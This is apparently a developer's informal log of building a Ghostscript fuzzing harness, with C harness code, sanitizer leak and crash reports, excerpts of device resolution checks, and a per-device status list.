/* Find index of the first -r... flag; -r must be followed by digits (e.g., -r200x200). */
static int find_resolution_arg(char *const *args, int argc) {
    for (int i = 0; i < argc; ++i) {
        const char *a = args[i];
        if (!a) continue;
        if (strncmp(a, "-r", 2) == 0) {
            // Require something like -rNNN or -rNNNxMMM
            const char *p = a + 2;
            if (*p) return i;
        }
    }
    return -1;
}

/* Replace args[idx] with a newly allocated "-r<res>" string. */
static bool replace_resolution_arg(char **args, int idx, const char *res) {
    if (idx < 0 || !res) return false;
    size_t need = 2 /*-r*/ + strlen(res) + 1;
    char *s = (char *)malloc(need);
    if (!s) return false;
    snprintf(s, need, "-r%s", res);
    args[idx] = s; // OK to leak a tiny bit in a short-lived fuzzer process
    return true;
}

/* Map device → preferred resolution string ("600x600", etc.)
   Extend this as you discover more device requirements. */
static const char *device_default_res(const char *device_name) {
    if (!device_name) return NULL;

    /* Example from your note: md1xMono wants 600x600 */
    if (strcmp(device_name, "md1xMono") == 0) return "600x600";

    /* Add more rules here, e.g.:
       if (strcmp(device_name, "someOtherDevice") == 0) return "300x300";
    */

    return NULL; // no override
}

/* Public entry point: tweak args[] in-place based on -sDEVICE=... */
static void adjust_gs_args_for_device(char **args, int argc) {
    const char *dev = extract_device_from_args(args, argc);
    if (!dev) return;

    const char *want_res = device_default_res(dev);
    if (!want_res) return; // nothing to change for this device

    int r_idx = find_resolution_arg(args, argc);
    if (r_idx >= 0) {
        (void)replace_resolution_arg(args, r_idx, want_res);
    }
    /* If there were no -r flag present, you could optionally insert one.
       Since your array is static, we avoid resizing here. If you want insertion,
       make args dynamic and append "-r<want_res>" before "-_" sentinel. */
}

int fuzz_gs_device(
    const unsigned char *buf,
    size_t size,
    int color_scheme,
    const char *device_target,
    const char *output_file,
    int do_interpolation
)
{

    int ret;
    void *gs = NULL;
    char color_space[50];
    char gs_device[50];
    char gs_o[100];
    char opt_interpolation[50];
    /*
     * We are expecting color_scheme to be in the [0:62] interval.
     * This corresponds to the color schemes defined here:
     * https://github.com/ArtifexSoftware/ghostpdl/blob/8c97d5adce0040ac38a1fb4d7954499c65f582ff/cups/libs/cups/raster.h#L102
     */
    sprintf(color_space, "-dcupsColorSpace=%d", color_scheme);
    sprintf(gs_device, "-sDEVICE=%s", device_target);
    sprintf(gs_o, "-sOutputFile=%s", output_file);
    if (do_interpolation) {
        sprintf(opt_interpolation, "-dDOINTERPOLATE");
    }
    else {
        sprintf(opt_interpolation, "-dNOINTERPOLATE");
    }
    /* Mostly stolen from cups-filters gstoraster. */
    char *args[] = {
        "gs",
        // "-q",
        // "-sICCProfilesDir=/usr/share/ghostscript/10.02.1/iccprofiles/",
        // "-sGenericResourceDir=/usr/share/ghostscript/10.02.1/Resource/",
        // "-I/tmp/gsinit_override/",
        "-K1048576",
        "-r200x200",
        "-sDriver=./libopv.so",
        "-sBandListStorage=memory",
        "-dMaxBitmap=0",
        "-dBufferSpace=450k",
        "-dMediaPosition=1",
        // "-Z:gsicc",
        color_space,
        //"-dQUIET",
        "-dSAFER",
        "-dNOPAUSE",
        "-dBATCH",
        opt_interpolation,
        "-dNOMEDIAATTRS",
        //"-sstdout=%%stderr",
        gs_o,
        gs_device,
        "-_",
    };

    // Check override stuff...
    int argc = sizeof(args) / sizeof(args[0]); // if it's a fixed array

    adjust_gs_args_for_device(args, argc); // Override...

    /* Stash buffers globally, for gs_stdin(). */
    g_data = buf;
    g_size = size;

    ret = gsapi_new_instance(&gs, NULL);
    if (ret < 0) {
        fprintf(stderr, "gsapi_new_instance: error %d\n", ret);
        return ret;
    }

    gsapi_set_stdio(gs, gs_stdin, gs_stdnull, gs_stdnull);
    ret = gsapi_set_arg_encoding(gs, GS_ARG_ENCODING_UTF8);
    if (ret < 0) {
        fprintf(stderr, "gsapi_set_arg_encoding: error %d\n", ret);
        gsapi_delete_instance(gs);
        return ret;
    }

    ret = gsapi_init_with_args(gs, argc, args);
    if (ret && ret != gs_error_Quit)
        /* Just keep going, to cleanup. */
        fprintf(stderr, "gsapi_init_with_args: error %d\n", ret);

    ret = gsapi_exit(gs);
    if (ret < 0 && ret != gs_error_Quit) {
        fprintf(stderr, "gsapi_exit: error %d\n", ret);
        return ret;
    }

    gsapi_delete_instance(gs);

    return 0;
}



/* Pick target device from this list (no leading '/'). Got from "gs -h" */
static const char *devices[] = {
    "lp9800c","hpdj550c","tiffsep1","dfaxhigh","hocr","lp8000c","eps9mid","psdrgb",
    "x11gray4","stcolor","lj5gray","cljet5pr","plan","oprp","jetp3852","bjc600",
    "pam","lps4500","hpdj560c","txtwrite","dfaxlow","pdfocr8","lp8100","epson",
    "psdrgb16","x11mono","t4693d2","lj5mono","coslw2p","plan9bm","opvp","jj100",
    "bjc800","pamcmyk32","lps6500","hpdj600","urfcmyk","display","pdfocr24","lp8200c",
    "epsonc","psdrgbtags","x11rg16x","t4693d4","ljet2p","coslwxl","planc","paintjet",
    "la50","bjc880j","pamcmyk4","lq850","hpdj660c","urfgray","docxwrite","pdfocr32",
    "lp8300c","escp","spotcmyk","x11rg32x","t4693d8","ljet3","declj250","plang",
    "pcl3","la70","bjccmyk","pbm","lxm3200","hpdj670c","urfrgb","eps2write",
    "nullpage","lp8300f","escpage","tiff12nc","pclm","tek4696","ljet3d","deskjet",
    "plank","photoex","la75","bjccolor","pbmraw","lxm5700m","hpdj680c","xcf",
    "pdfwrite","lp8400f","fmlbp","tiff24nc","pclm8","uniprint","ljet4","dj505j",
    "planm","picty180","la75plus","bjcgray","pcx16","m8510","hpdj690c","xpswrite",
    "faxg3","lp8500c","fmpr","tiff32nc","bit","xes","ljet4d","djet500",
    "plib","pj","laserjet","bjcmono","pcx24b","md1xMono","hpdj850c","alc1900",
    "faxg32d","lp8600","fs600","tiff48nc","bitcmyk","appleraster","ljet4pjl","djet500c",
    "plibc","pjetxl","lbp310","cdeskjet","pcx256","md2k","hpdj855c","alc2000",
    "faxg4","lp8600f","gdi","tiff64nc","bitrgb","cups","ljetplus","dl2100",
    "plibg","pjxl","lbp320","cdj1600","pcxcmyk","md50Eco","hpdj870c","alc4000",
    "fpng","lp8700","hl1240","tiffcrle","bitrgbtags","pwgraster","ln03","dnj650c",
    "plibk","pjxl300","lbp8","cdj500","pcxgray","md50Mono","hpdj890c","alc4100",
    "inferno","lp8800c","hl1250","tiffg3","bmp16","urf","lp1800","epl2050",
    "plibm","pr1000","lex2050","cdj550","pcxmono","md5k","hpdjplus","alc8500",
    "ink_cov","lp8900","hl7x0","tiffg32d","bmp16m","ijs","lp1900","epl2050p",
    "pnm","pr1000_4","lex3200","cdj670","pdfimage24","mj500c","hpdjportable","alc8600",
    "inkcov","lp9000b","hpdj1120c","tiffg4","bmp256","png16","lp2000","epl2120",
    "pnmraw","pr150","lex5700","cdj850","pdfimage32","mj6000c","ibmpro","alc9100",
    "jpeg","lp9000c","hpdj310","tiffgray","bmp32b","png16m","lp2200","epl2500",
    "ppm","pr201","lex7000","cdj880","pdfimage8","mj700v2c","imagen","ap3250",
    "jpegcmyk","lp9100","hpdj320","tifflzw","bmpgray","png16malpha","lp2400","epl2750",
    "ppmraw","bbox","pxlcolor","lips2p","cdj890","pgm","mj8000c","itk24i",
    "appledmp","jpeggray","lp9200b","hpdj340","tiffpack","bmpmono","png256","lp2500",
    "epl5800","pppm","x11","pxlmono","lips3","cdj970","pgmraw","ml600",
    "itk38","atx23","mgr4","lp9200c","hpdj400","tiffscaled","bmpsep1","png48",
    "lp2563","epl5900","ps2write","x11alpha","r4081","lips4","cdjcolor","pgnm",
    "necp6","iwhi","atx24","mgr8","lp9300","hpdj500","tiffscaled24","bmpsep8",
    "pngalpha","lp3000c","epl6100","psdcmyk","x11cmyk","rinkj","lips4v","cdjmono",
    "pgnmraw","npdl","iwhic","atx38","mgrgray2","lp9400","hpdj500c","tiffscaled32",
    "ccr","pnggray","lp7500","epl6200","psdcmyk16","x11cmyk2","rpdl","lj250",
    "cdnj500","pkm","oce9050","iwlo","bj10e","mgrgray4","lp9500c","hpdj510",
    "tiffscaled4","cfax","pngmono","lp7700","eplcolor","psdcmykog","x11cmyk4","samsunggdi",
    "lj3100sw","chp2200","pkmraw","oki182","iwlow","bj10v","mgrgray8","lp9600",
    "hpdj520","tiffscaled8","cif","pngmonod","lp7900","eplmono","psdcmyktags","x11cmyk8",
    "sj48","lj4dith","cljet5","pksm","oki4w","iwlq","bj10vh","mgrmono",
    "lp9600s","hpdj540","tiffsep","devicen","ocr","lp8000","eps9high","psdcmyktags16",
    "x11gray2","st800","lj4dithp","cljet5c","pksmraw","okiibm","iwlqc","bj200",
    "miff24"
};

int n_devices = 362; // The number of devices...

int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size, char* dev) {
    /* Always write to /dev/null. */
    (void)fuzz_gs_device(data, size,
                         1,
                         dev, // "oprp", // Modify this maybe???
                         "/dev/null",
                         0);
    return 0;
}



#ifdef USE_AFL

__AFL_FUZZ_INIT();

int main(int argc, char **argv) {
    // LLVMFuzzerInitialize(&argc, &argv); // No initializati
    if (argc != 2) {
        exit(1);
    }
    __AFL_INIT();
    const uint8_t *buf = __AFL_FUZZ_TESTCASE_BUF;
    while (__AFL_LOOP(100000)) {
        int len = __AFL_FUZZ_TESTCASE_LEN;
        LLVMFuzzerTestOneInput(buf, (size_t)len, argv[1]);
    }
    return 0;
}

#endif

```

whoops there is a memory leak:

```
=================================================================
==406996==ERROR: LeakSanitizer: detected memory leaks

Direct leak of 10 byte(s) in 1 object(s) allocated from:
    #0 0x5f74be785c23 in malloc (/home/oof/ghostpdlafl/debug_fuzzer+0x24b4c23) (BuildId: 284b817b83aadde8adb22098110d84601e6d5a2e)
    #1 0x5f74be7c6f22 in replace_resolution_arg /home/oof/ghostpdlafl/debugging.c:88:23
    #2 0x5f74be7c6f22 in adjust_gs_args_for_device /home/oof/ghostpdlafl/debugging.c:120:15
    #3 0x5f74be7c6f22 in fuzz_gs_device /home/oof/ghostpdlafl/debugging.c:188:5
    #4 0x5f74be7c79a8 in LLVMFuzzerTestOneInput /home/oof/ghostpdlafl/debugging.c:281:11
    #5 0x5f74be7c79a8 in main /home/oof/ghostpdlafl/debugging.c:304:9
    #6 0x79129362a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #7 0x79129362a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #8 0x5f74be6eadd4 in _start (/home/oof/ghostpdlafl/debug_fuzzer+0x2419dd4) (BuildId: 284b817b83aadde8adb22098110d84601e6d5a2e)

SUMMARY: AddressSanitizer: 10 byte(s) leaked in 1 allocation(s).
```

I fixed that and now it works...

These are the devices which we go through:

```
"display" (doesn't work for whatever reason, not really sure why)

"plib" (allocates huge amounts of memory and then doesn't work...)
see:

GPL Ghostscript GIT PRERELEASE 10.06.0 (2025-04-29)
Copyright (C) 2025 Artifex Software, Inc.  All rights reserved.
This software is supplied under the GNU AGPLv3 and comes with NO WARRANTY:
see the file COPYING for details.
base/gsicc_manage.c:2188:23: runtime error: member access within null pointer of type 'cmm_profile_t' (aka 'struct cmm_profile_s')
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior base/gsicc_manage.c:2188:23
[a+]gs_malloc(cmd list buf(retry open))(1095411764) = 0x0: exceeded limit, used=2983016, max=976682482
**** Unable to open the initial device, quitting.
gsapi_init_with_args: error -100

soo that is a bit weird...

this also applies to the other ones:

/* The device descriptors themselves */
const gx_device_plib gs_plib_device =
  plib_prn_device(plib_initialize_device_procs, "plib",
                  3, 24, 255, 255, plib_print_page);
const gx_device_plib gs_plibg_device =
  plib_prn_device(plibg_initialize_device_procs, "plibg",
                  1, 8, 255, 0, plibg_print_page);
const gx_device_plib gs_plibm_device =
  plib_prn_device(plibm_initialize_device_procs, "plibm",
                  1, 1, 1, 0, plibm_print_page);
const gx_device_plib gs_plibk_device =
  plib_prn_device(plibk_initialize_device_procs, "plibk",
                  4, 4, 1, 1, plibk_print_page);
const gx_device_plib gs_plibc_device =
  plib_prn_device(plibc_initialize_device_procs, "plibc",
                  4, 32, 255, 255, plibc_print_page);

the insane amount of memory allocation happens here:

/*
 * Define a special open procedure that changes create_buf_device to use
 * a planar device.
 */
static int
plib_open(gx_device * pdev)
{
    gx_device_plib * const bdev = (gx_device_plib *)pdev;
    gx_device_printer * const ppdev = (gx_device_printer *)pdev;
    int code;

#ifdef DEBUG_PRINT
    emprintf(pdev->memory, "plib_open\n");
#endif
    bdev->printer_procs.buf_procs.create_buf_device = plib_create_buf_device;
    bdev->printer_procs.buf_procs.setup_buf_device = plib_setup_buf_device;
    bdev->printer_procs.buf_procs.size_buf_device = plib_size_buf_device;
    pdev->num_planar_planes = 1;

    bdev->space_params.banding_type = BandingAlways;

    /* You might expect us to call gdev_prn_open_planar rather than
     * gdev_prn_open, but if we do that, it overwrites the 2 function
     * pointers we've just overwritten! */
    code = gdev_prn_open(pdev);
    if (code < 0)
        return code;
    if (ppdev->space_params.band.BandHeight < MINBANDHEIGHT) {
        emprintf2(pdev->memory, "BandHeight of %d not valid, BandHeight minimum is %d\n",
                  ((gx_device_printer *)pdev)->space_params.band.BandHeight,
                  MINBANDHEIGHT);

        return_error(gs_error_rangecheck);
    }
    pdev->color_info.separable_and_linear = GX_CINFO_SEP_LIN;
    set_linear_color_bits_mask_shift(pdev);

    /* Start the actual job. */
#ifdef DEBUG_PRINT
    emprintf(pdev->memory, "calling job_begin\n");
#endif
    code = gs_band_donor_init(&bdev->opaque, pdev->memory);
#ifdef DEBUG_PRINT
    emprintf(pdev->memory, "called\n");
#endif

    return code;
}

when calling the gdev_prn_open function.... idk...



next up is this here:


GPL Ghostscript GIT PRERELEASE 10.06.0 (2025-04-29)
Copyright (C) 2025 Artifex Software, Inc.  All rights reserved.
This software is supplied under the GNU AGPLv3 and comes with NO WARRANTY:
see the file COPYING for details.
base/gsicc_manage.c:2188:23: runtime error: member access within null pointer of type 'cmm_profile_t' (aka 'struct cmm_profile_s')
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior base/gsicc_manage.c:2188:23
**** Unable to open the initial device, quitting.
gsapi_init_with_args: error -100
base/fapi_ft.c:1950:43: runtime error: member access within null pointer of type 'struct FT_OutlineGlyphRec_'
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior base/fapi_ft.c:1950:43
base/fapi_ft.c:1951:42: runtime error: member access within null pointer of type 'struct FT_BitmapGlyphRec_'
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior base/fapi_ft.c:1951:42

[181] md5k            -> UNKNOWN (string)

so we fixed those too by just adding the correct resolution. The ijs output device also doesn't work

there are also the lips devices which has these kinds of checks:


    else if (ptype == LIPS2P) {
        /* LIPS II+ support DPI is 240x240 */
        if (xdpi != LIPS2P_DPI_MAX)
            return_error(gs_error_rangecheck);
    } else if (ptype == LIPS3) {

so for lips2p we need 240x240


There are also these checks:



gx_device_mj far_data gs_mj700v2c_device =
mjcmyk_device(mj700v2c_initialize_device_procs, "mj700v2c",
              360, 360, BITSPERPIXEL,
              mj700v2c_print_page,
              1024, 1024, 1024, 1024, 1024, 0, 1, 1);

gx_device_mj far_data gs_mj500c_device =
mjcmy_device(mj500c_initialize_device_procs, "mj500c",
             360, 360, BITSPERPIXEL,
             mj500c_print_page, 1024, 1024, 1024, 1024, 1024, 0, 1, 1);

gx_device_mj far_data gs_mj6000c_device =
mjcmyk_device(mj6000c_initialize_device_procs, "mj6000c",
              360, 360, BITSPERPIXEL,
              mj6000c_print_page, 1024, 1024, 1024, 1024, 1024, 0, 1, 1);

gx_device_mj far_data gs_mj8000c_device =
mjcmyk_device(mj8000c_initialize_device_procs, "mj8000c",
              360, 360, BITSPERPIXEL,
              mj8000c_print_page, 1024, 1024, 1024, 1024, 1024, 0, 1, 1);

/* Get the paper size code, based on width and height. */
static int
gdev_mjc_paper_size(gx_device *dev)
{
  int width = (int)dev->MediaSize[0];
  int height = (int)dev->MediaSize[1];

  if (width == 1190 && height == 1684)
    return PAPER_SIZE_A2;
  else
    return PAPER_SIZE_A4;
}

static int
mj700v2c_open(gx_device * pdev)
{
  return mj_open(pdev, MJ700V2C);
}

static int
mj500c_open(gx_device * pdev)
{
  return mj_open(pdev, MJ700V2C);
}

static int
mj6000c_open(gx_device * pdev)
{
  return mj_open(pdev, MJ700V2C);
}

static int
mj8000c_open(gx_device * pdev)
{
  return mj_open(pdev, MJ700V2C);
}

/* Open the printer and set up the margins. */
static int
mj_open(gx_device *pdev, int ptype)
{       /* Change the margins if necessary. */
  int xdpi = (int)pdev->x_pixels_per_inch;
  int ydpi = (int)pdev->y_pixels_per_inch;

  static const float mj_margin[4] = { MJ700V2C_MARGINS_A4 };
  static const float mj6000c_a2[4] = { MJ6000C_MARGINS_A2 };
  static const float mj8000c_a2[4] = { MJ8000C_MARGINS_A2 };

  const float *m;

  int paper_size;

#if 0
  /* Set up colour params if put_props has not already done so */
  if (pdev->color_info.num_components == 0)
    set_bpp(pdev, pdev->color_info.depth);
#endif

  paper_size = gdev_mjc_paper_size(pdev);
  if (paper_size == PAPER_SIZE_A2 ) {
    if (ptype == MJ6000C)
      m = mj6000c_a2;
    else if (ptype == MJ8000C)
      m = mj8000c_a2;
    else
      m = mj_margin;
  } else {
    m = mj_margin;
  }

  gx_device_set_margins(pdev, m, true);

  if (mj->colorcomp == 3)
    mj->density = (int)(mj->density * 720 / ydpi) * 1.5;
  else
    mj->density = mj->density * 720 / ydpi;

  /* Print Resolution Check */
  if (!((xdpi == 180 && ydpi == 180) ||
      (xdpi == 360 && ydpi == 360) ||
      (xdpi == 720 && ydpi == 720) ||
      (xdpi == 360 && ydpi == 720) ||
      (xdpi == 720 && ydpi == 360)))
    return_error(gs_error_rangecheck);

  return gdev_prn_open(pdev);
}


so we can just replace the stuff with mj700v2c, mj500c, mj6000c and mj8000c with the 180x180 stuff...

then for the rpdl stuff we need this here:

gx_device_lprn far_data gs_rpdl_device =
lprn_device(gx_device_lprn, rpdl_initialize_device_procs, "rpdl",
            DPI, DPI, 0.0, 0.0, 0.0, 0.0, 1,
            rpdl_print_page_copies, rpdl_image_out);

#define ppdev ((gx_device_printer *)pdev)

/* Open the printer. */
static int
rpdl_open(gx_device * pdev)
{
    int xdpi = (int)pdev->x_pixels_per_inch;
    int ydpi = (int)pdev->y_pixels_per_inch;

    /* Resolution Check */
    if (xdpi != ydpi)
        return_error(gs_error_rangecheck);
    if (xdpi != 240 && xdpi != 400 && xdpi != 600)
        return_error(gs_error_rangecheck);

    return gdev_prn_open(pdev);
}

soo just place 240x240 for that???


there is this stuff here: ``[  8] x11gray4        -> ERR 1``` but I think that this is a false positive since it seems to run correctly for me...

it causes a memory leak here:

=================================================================
==524767==ERROR: LeakSanitizer: detected memory leaks

Direct leak of 160 byte(s) in 1 object(s) allocated from:
    #0 0x56f0e23abc23 in malloc (/home/oof/ghostpdlafl/pdf_debug+0x24b4c23) (BuildId: 4fa7d4bd06da1b65dc4550df9e9fdd5a2055f642)
    #1 0x77075ddfb938 in XCreateGC /build/libx11-aL6a2q/libx11-1.8.7/build/src/../../src/CrGC.c:75:15
    #2 0x56f0e2e15487 in gdev_x_open /home/oof/ghostpdlafl/./devices/gdevxini.c:474:16
    #3 0x56f0e2db8b21 in x_open /home/oof/ghostpdlafl/./devices/gdevx.c:207:12
    #4 0x56f0e2e43a41 in x_wrap_open /home/oof/ghostpdlafl/./devices/gdevxalt.c:94:13
    #5 0x56f0e418f880 in gs_opendevice /home/oof/ghostpdlafl/./base/gsdevice.c:461:20

SUMMARY: AddressSanitizer: 160 byte(s) leaked in 1 allocation(s).
1

which caused that error code 1.


this here:


base/gxclpath.c:1696:16: runtime error: left shift of negative value -30
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior base/gxclpath.c:1696:16
gdevadmp: Bin out of range: 75.
gdevadmp: Fatal error, cleaning up.
gdevadmp: Please write Josh Moyer <JMoyer@NODOMAIN.NET> for help.
gdevadmp: Output is likely corrupt -- delete the file or reset your printer.
gdevadmp: Exiting.
oof@elskun-lppri:~/ghostpdlafl$ ./pdf_debug iwlqc < Hakemuskirje.pdf

also causes an error for some reason...

also the appledmp stuff also causes this here:

[248] appledmp        -> ERR 241

```

Ok, so after doing those fixes, I think that the harness now currently works good enough for fuzzing purposes. There is still a small thing which we need to implement, some of the output devices need a seekable output file, but if we pipe everything to /dev/null , then it fails, see:

```
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior base/scfe.c:499:17
I/O Error: Output File "/dev/null" must be seekable
   **** Error: Page drawing error occurred.
               Could not draw this page at all, page will be missing in the output.
base/fapi_ft.c:1950:43: runtime error: member access within null pointer of type 'struct FT_OutlineGlyphRec_'
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior base/fapi_ft.c:1950:43
base/fapi_ft.c:1951:42: runtime error: member access within null pointer of type 'struct FT_BitmapGlyphRec_'
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior base/fapi_ft.c:1951:42

[252] tiffpack        -> OK
```

in the original fuzzing harness code, there is this here:

```
oof@elskun-lppri:~/ghostscript_mutator/pdf_fuzzing/original$ cat gs_device_tiffsep1_fuzzer.cc
/* Copyright 2022 Google LLC

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/
#include <sys/types.h>
#include <unistd.h>
#include <stdio.h>

#include "gs_fuzzlib.h"

extern "C" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
        char filename[256];
        sprintf(filename, "/tmp/libfuzzer.%d.tiff", getpid());
        fuzz_gs_device(data, size, 1, "tiffsep1", filename, 0);
        return 0;
}
```

Here is my final list of supported fuzzed devices:

```
[  0] lp9800c         -> OK
[  1] hpdj550c        -> UNKNOWN (string)
[  2] tiffsep1        -> OK
[  3] dfaxhigh        -> OK
[  4] hocr            -> UNKNOWN (string)
[  5] lp8000c         -> OK
[  6] eps9mid         -> OK
[  7] psdrgb          -> OK
[  8] x11gray4        -> OK
[  9] stcolor         -> OK
[ 10] lj5gray         -> OK
[ 11] cljet5pr        -> OK
[ 12] plan            -> OK
[ 13] oprp            -> UNKNOWN (string)
[ 14] jetp3852        -> OK
[ 15] bjc600          -> OK
[ 16] pam             -> OK
[ 17] lps4500         -> OK
[ 18] hpdj560c        -> UNKNOWN (string)
[ 19] txtwrite        -> OK
[ 20] dfaxlow         -> OK
[ 21] pdfocr8         -> OK
[ 22] lp8100          -> OK
[ 23] epson           -> OK
[ 24] psdrgb16        -> OK
[ 25] x11mono         -> OK
[ 26] t4693d2         -> OK
[ 27] lj5mono         -> OK
[ 28] coslw2p         -> OK
[ 29] plan9bm         -> OK
[ 30] opvp            -> UNKNOWN (string)
[ 31] jj100           -> OK
[ 32] bjc800          -> OK
[ 33] pamcmyk32       -> OK
[ 34] lps6500         -> OK
[ 35] hpdj600         -> UNKNOWN (string)
[ 36] urfcmyk         -> OK
[ 37] display         -> UNKNOWN (string)
[ 38] pdfocr24        -> OK
[ 39] lp8200c         -> OK
[ 40] epsonc          -> OK
[ 41] psdrgbtags      -> OK
[ 42] x11rg16x        -> OK
[ 43] t4693d4         -> OK
[ 44] ljet2p          -> OK
[ 45] coslwxl         -> OK
[ 46] planc           -> OK
[ 47] paintjet        -> OK
[ 48] la50            -> OK
[ 49] bjc880j         -> OK
[ 50] pamcmyk4        -> OK
[ 51] lq850           -> OK
[ 52] hpdj660c        -> UNKNOWN (string)
[ 53] urfgray         -> OK
[ 54] docxwrite       -> OK
[ 55] pdfocr32        -> OK
[ 56] lp8300c         -> OK
[ 57] escp            -> OK
[ 58] spotcmyk        -> OK
[ 59] x11rg32x        -> OK
[ 60] t4693d8         -> OK
[ 61] ljet3           -> OK
[ 62] declj250        -> OK
[ 63] plang           -> OK
[ 64] pcl3            -> OK
[ 65] la70            -> OK
[ 66] bjccmyk         -> OK
[ 67] pbm             -> OK
[ 68] lxm3200         -> OK
[ 69] hpdj670c        -> UNKNOWN (string)
[ 70] urfrgb          -> OK
[ 71] eps2write       -> OK
[ 72] nullpage        -> OK
[ 73] lp8300f         -> OK
[ 74] escpage         -> OK
[ 75] tiff12nc        -> OK
[ 76] pclm            -> OK
[ 77] tek4696         -> OK
[ 78] ljet3d          -> OK
[ 79] deskjet         -> OK
[ 80] plank           -> OK
[ 81] photoex         -> OK
[ 82] la75            -> OK
[ 83] bjccolor        -> OK
[ 84] pbmraw          -> OK
[ 85] lxm5700m        -> OK
[ 86] hpdj680c        -> UNKNOWN (string)
[ 87] xcf             -> OK
[ 88] pdfwrite        -> OK
[ 89] lp8400f         -> OK
[ 90] fmlbp           -> OK
[ 91] tiff24nc        -> OK
[ 92] pclm8           -> OK
[ 93] uniprint        -> OK
[ 94] ljet4           -> OK
[ 95] dj505j          -> OK
[ 96] planm           -> OK
[ 97] picty180        -> OK
[ 98] la75plus        -> OK
[ 99] bjcgray         -> OK
[100] pcx16           -> OK
[101] m8510           -> OK
[102] hpdj690c        -> UNKNOWN (string)
[103] xpswrite        -> OK
[104] faxg3           -> OK
[105] lp8500c         -> OK
[106] fmpr            -> OK
[107] tiff32nc        -> OK
[108] bit             -> OK
[109] xes             -> OK
[110] ljet4d          -> OK
[111] djet500         -> OK
[112] plib            -> UNKNOWN (string)
[113] pj              -> OK
[114] laserjet        -> OK
[115] bjcmono         -> OK
[116] pcx24b          -> OK
[117] md1xMono        -> OK
[118] hpdj850c        -> UNKNOWN (string)
[119] alc1900         -> OK
[120] faxg32d         -> OK
[121] lp8600          -> OK
[122] fs600           -> OK
[123] tiff48nc        -> OK
[124] bitcmyk         -> OK
[125] appleraster     -> OK
[126] ljet4pjl        -> OK
[127] djet500c        -> OK
[128] plibc           -> UNKNOWN (string)
[129] pjetxl          -> OK
[130] lbp310          -> OK
[131] cdeskjet        -> OK
[132] pcx256          -> OK
[133] md2k            -> OK
[134] hpdj855c        -> UNKNOWN (string)
[135] alc2000         -> OK
[136] faxg4           -> OK
[137] lp8600f         -> OK
[138] gdi             -> OK
[139] tiff64nc        -> OK
[140] bitrgb          -> OK
[141] cups            -> OK
[142] ljetplus        -> OK
[143] dl2100          -> OK
[144] plibg           -> UNKNOWN (string)
[145] pjxl            -> OK
[146] lbp320          -> OK
[147] cdj1600         -> OK
[148] pcxcmyk         -> OK
[149] md50Eco         -> OK
[150] hpdj870c        -> UNKNOWN (string)
[151] alc4000         -> OK
[152] fpng            -> OK
[153] lp8700          -> OK
[154] hl1240          -> OK
[155] tiffcrle        -> OK
[156] bitrgbtags      -> OK
[157] pwgraster       -> OK
[158] ln03            -> OK
[159] dnj650c         -> OK
[160] plibk           -> UNKNOWN (string)
[161] pjxl300         -> OK
[162] lbp8            -> OK
[163] cdj500          -> OK
[164] pcxgray         -> OK
[165] md50Mono        -> OK
[166] hpdj890c        -> UNKNOWN (string)
[167] alc4100         -> OK
[168] inferno         -> OK
[169] lp8800c         -> OK
[170] hl1250          -> OK
[171] tiffg3          -> OK
[172] bmp16           -> OK
[173] urf             -> OK
[174] lp1800          -> OK
[175] epl2050         -> OK
[176] plibm           -> UNKNOWN (string)
[177] pr1000          -> OK
[178] lex2050         -> OK
[179] cdj550          -> OK
[180] pcxmono         -> OK
[181] md5k            -> OK
[182] hpdjplus        -> UNKNOWN (string)
[183] alc8500         -> OK
[184] ink_cov         -> OK
[185] lp8900          -> OK
[186] hl7x0           -> OK
[187] tiffg32d        -> OK
[188] bmp16m          -> OK
[189] ijs             -> UNKNOWN (string)
[190] lp1900          -> OK
[191] epl2050p        -> OK
[192] pnm             -> OK
[193] pr1000_4        -> OK
[194] lex3200         -> OK
[195] cdj670          -> OK
[196] pdfimage24      -> OK
[197] mj500c          -> UNKNOWN (string)
[198] hpdjportable    -> UNKNOWN (string)
[199] alc8600         -> OK
[200] inkcov          -> OK
[201] lp9000b         -> OK
[202] hpdj1120c       -> UNKNOWN (string)
[203] tiffg4          -> OK
[204] bmp256          -> OK
[205] png16           -> OK
[206] lp2000          -> OK
[207] epl2120         -> OK
[208] pnmraw          -> OK
[209] pr150           -> OK
[210] lex5700         -> OK
[211] cdj850          -> OK
[212] pdfimage32      -> OK
[213] mj6000c         -> UNKNOWN (string)
[214] ibmpro          -> OK
[215] alc9100         -> OK
[216] jpeg            -> OK
[217] lp9000c         -> OK
[218] hpdj310         -> UNKNOWN (string)
[219] tiffgray        -> OK
[220] bmp32b          -> OK
[221] png16m          -> OK
[222] lp2200          -> OK
[223] epl2500         -> OK
[224] ppm             -> OK
[225] pr201           -> OK
[226] lex7000         -> OK
[227] cdj880          -> OK
[228] pdfimage8       -> OK
[229] mj700v2c        -> UNKNOWN (string)
[230] imagen          -> OK
[231] ap3250          -> OK
[232] jpegcmyk        -> OK
[233] lp9100          -> OK
[234] hpdj320         -> UNKNOWN (string)
[235] tifflzw         -> OK
[236] bmpgray         -> OK
[237] png16malpha     -> UNKNOWN (string)
[238] lp2400          -> OK
[239] epl2750         -> OK
[240] ppmraw          -> OK
[241] bbox            -> OK
[242] pxlcolor        -> OK
[243] lips2p          -> OK
[244] cdj890          -> OK
[245] pgm             -> OK
[246] mj8000c         -> OK
[247] itk24i          -> OK
[248] appledmp        -> ERR 241
[249] jpeggray        -> OK
[250] lp9200b         -> OK
[251] hpdj340         -> UNKNOWN (string)
[252] tiffpack        -> OK
[253] bmpmono         -> OK
[254] png256          -> OK
[255] lp2500          -> OK
[256] epl5800         -> OK
[257] pppm            -> OK
[258] x11             -> OK
[259] pxlmono         -> OK
[260] lips3           -> OK
[261] cdj970          -> OK
